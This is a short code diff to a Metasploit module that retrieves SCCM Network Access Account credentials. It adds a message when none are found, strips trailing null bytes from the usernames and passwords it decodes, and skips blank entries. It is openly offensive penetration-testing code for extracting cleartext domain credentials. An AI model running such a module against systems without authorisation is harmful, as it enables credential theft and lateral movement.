@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Get NAA Creds',
+        'Name' => 'Get NAA Credentials',
         'Description' => %q{
           This module attempts to retrieve the Network Access Account, if configured, from the SCCM server.
           This requires a computer account, which can be added using the samr_account module.
@@ -154,8 +154,12 @@ class MetasploitModule < Msf::Auxiliary
     decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
     results = get_creds_from_policy_doc(decrypted_policy)
 
+    if results.length == 0
+      print_status('No NAA credentials configured')
+    end
+
     results.each do |username, password|
-      print_good("Found valid NAA creds: #{username}:#{password}")
+      print_good("Found valid NAA credentials: #{username}:#{password}")
     end
   rescue SocketError => e
     fail_with(Failure::Unreachable, e.message)
@@ -361,11 +365,16 @@ class MetasploitModule < Msf::Auxiliary
     naa_sections.each do |section|
       username = section.xpath("property[@name='NetworkAccessUsername']/value").text
       username = deobfuscate_policy_value(username)
+      username.delete_suffix!("\x00")
 
       password = section.xpath("property[@name='NetworkAccessPassword']/value").text
       password = deobfuscate_policy_value(password)
+      password.delete_suffix!("\x00")
 
-      results.add([username, password])
+      unless username.blank? && password.blank?
+        # Deleted credentials seem to result in just an empty value for username and password
+        results.add([username, password])
+      end
     end
     results
   end
